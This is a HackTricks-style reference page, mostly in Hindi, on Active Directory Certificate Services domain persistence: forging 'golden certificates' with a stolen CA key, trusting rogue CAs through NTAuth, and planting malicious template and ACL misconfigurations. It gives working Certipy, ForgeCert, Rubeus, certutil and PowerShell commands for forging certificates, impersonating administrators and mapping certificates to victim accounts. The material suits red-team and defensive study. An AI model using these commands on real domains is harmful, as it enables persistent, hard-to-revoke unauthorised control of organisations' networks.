# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**यह [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) में साझा किए गए domain persistence techniques का सारांश है। आगे के विवरण के लिए उसे देखें।**

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

How can you tell that a certificate is a CA certificate?

यह निर्धारित किया जा सकता है कि कोई certificate CA certificate है यदि कुछ शर्तें पूरी हों:

- certificate CA server पर संग्रहित होता है, और इसकी private key मशीन के DPAPI द्वारा सुरक्षित रहती है, या यदि operating system इसे सपोर्ट करता है तो TPM/HSM जैसे hardware द्वारा।
- certificate के Issuer और Subject दोनों fields CA के distinguished name से मेल खाते हैं।
- "CA Version" extension केवल CA certificates में ही मौजूद होती है।
- certificate में Extended Key Usage (EKU) fields नहीं होते।

इस certificate की private key निकालने के लिए, CA server पर `certsrv.msc` tool बटी-इन GUI के माध्यम से समर्थित तरीका है। फिर भी, यह certificate सिस्टम में अन्य stored certificates से अलग नहीं है; इसलिए extraction के लिए [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) जैसे methods लागू किए जा सकते हैं।

Certificate और private key को Certipy का उपयोग करके निम्नलिखित command से भी प्राप्त किया जा सकता है:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA प्रमाणपत्र और उसकी निजी कुंजी `.pfx` फॉर्मेट में प्राप्त करने पर, [ForgeCert](https://github.com/GhostPack/ForgeCert) जैसे टूल्स का उपयोग वैध प्रमाणपत्र बनाने के लिए किया जा सकता है:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> सर्टिफिकेट जालसाजी के लिए लक्षित उपयोगकर्ता Active Directory में सक्रिय और प्रमाणीकरण करने में सक्षम होना चाहिए ताकि प्रक्रिया सफल हो सके। krbtgt जैसे विशेष खातों के लिए प्रमाणपत्र जालसाजी अप्रभावी है।

यह जाली प्रमाणपत्र निर्दिष्ट समाप्ति तिथि तक और तब तक **मान्य** रहेगा जब तक root CA प्रमाणपत्र **मान्य** है (आम तौर पर 5 से **10+ वर्षों** तक)। यह **machines** के लिए भी मान्य है, इसलिए **S4U2Self** के साथ मिलकर, एक attacker CA प्रमाणपत्र मान्य रहने तक किसी भी domain मशीन पर **persistence बनाए रख सकता है**।\
इसके अलावा, इस विधि से **जनरेट किए गए प्रमाणपत्र** **रद्द नहीं किए जा सकते** क्योंकि CA उनके बारे में अवगत नहीं है।

### मजबूत प्रमाणपत्र मैपिंग प्रवर्तन के तहत संचालन (2025+)

11 फरवरी 2025 से (KB5014754 rollout के बाद), domain controllers certificate mappings के लिए डिफ़ॉल्ट रूप से **Full Enforcement** पर सेट हैं। व्यवहारिक रूप से इसका अर्थ यह है कि आपके जाले हुए प्रमाणपत्रों में या तो:

- लक्ष्य खाते के साथ एक मजबूत बाइंडिंग हो (उदाहरण के लिए, SID security extension), या
- लक्ष्य ऑब्जेक्ट के `altSecurityIdentities` attribute पर एक मजबूत, स्पष्ट मैपिंग के साथ जोड़ा गया हो।

Persistence के लिए एक भरोसेमंद तरीका है चोरी किए गए Enterprise CA से जुड़े एक जाली प्रमाणपत्र को जारी करना और फिर पीड़ित प्रिंसिपल पर एक मजबूत स्पष्ट मैपिंग जोड़ना:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- यदि आप ऐसे forged certificates तैयार कर सकते हैं जिनमें SID security extension शामिल हो, तो वे Full Enforcement के तहत भी निहित रूप से map हो जाएँगे। अन्यथा, explicit strong mappings को प्राथमिकता दें। अधिक जानकारी के लिए देखें
[account-persistence](account-persistence.md)।
- Revocation यहाँ रक्षकों की मदद नहीं करता: forged certificates CA database के लिए अज्ञात होते हैं और इसलिए इन्हें revoke नहीं किया जा सकता।

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **domain controller** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

A self-signed CA certificate can be added to the `NTAuthCertificates` object by an attacker, provided they have control over this AD object. Normally, only members of the **Enterprise Admin** group, along with **Domain Admins** or **Administrators** in the **forest root’s domain**, are granted permission to modify this object. They can edit the `NTAuthCertificates` object using `certutil.exe` with the command `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, or by employing the [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
This capability is especially relevant when used in conjunction with a previously outlined method involving ForgeCert to dynamically generate certificates.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## दुर्भावनापूर्ण मिसकॉन्फ़िगरेशन - DPERSIST3

AD CS घटकों के security descriptor संशोधनों के माध्यम से persistence के अवसर बहुतायत में हैं। "[Domain Escalation](domain-escalation.md)" सेक्शन में वर्णित संशोधनों को एक हमलावार द्वारा, जिसके पास domain में elevated access हो, दुर्भावनापूर्ण रूप से लागू किया जा सकता है। इसमें संवेदनशील घटकों को "control rights" (उदा., WriteOwner/WriteDACL/etc.) जोड़ना शामिल है, जैसे कि:

- The **CA server’s AD computer** object
- The **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

एक दुर्भावनापूर्ण कार्यान्वयन का उदाहरण इस प्रकार होगा: यदि domain में किसी हमलावार के पास elevated permissions हैं, तो वह डिफ़ॉल्ट **`User`** certificate template पर **`WriteOwner`** permission जोड़ दे सकता है, जिसमें हमलावार उस अधिकार का principal हो। इसका शोषण करने के लिए, हमलावार सबसे पहले **`User`** template की ownership खुद कर लेगा। इसके बाद, template पर **`mspki-certificate-name-flag`** को **1** पर सेट किया जाएगा ताकि **`ENROLLEE_SUPPLIES_SUBJECT`** सक्षम हो और request में Subject Alternative Name प्रदान किया जा सके। तत्पश्चात हमलावार उस **template** का उपयोग करके enroll कर सकता है, alternative name के रूप में एक domain administrator नाम चुन सकता है, और प्राप्त प्रमाणपत्र का उपयोग DA के रूप में authentication के लिए कर सकता है।

लंबी अवधि के domain persistence के लिए हमलावर जो व्यावहारिक सेटिंग्स कर सकते हैं (पूर्ण विवरण और detection के लिए देखें {{#ref}}domain-escalation.md{{#endref}}):

- CA policy flags that allow SAN from requesters (e.g., enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`). This keeps ESC1-like paths exploitable.
- Template DACL or settings that allow authentication-capable issuance (e.g., adding Client Authentication EKU, enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlling the `NTAuthCertificates` object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup.

> [!TIP]
> हार्डन्ड वातावरणों में, KB5014754 के बाद, इन मिसकॉन्फ़िगरेशनों को explicit strong mappings (`altSecurityIdentities`) के साथ जोड़ने से यह सुनिश्चित होता है कि आपके जारी किए गए या forged प्रमाणपत्र भी तब उपयोगी बने रहें जब DCs strong mapping लागू करते हैं।



## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
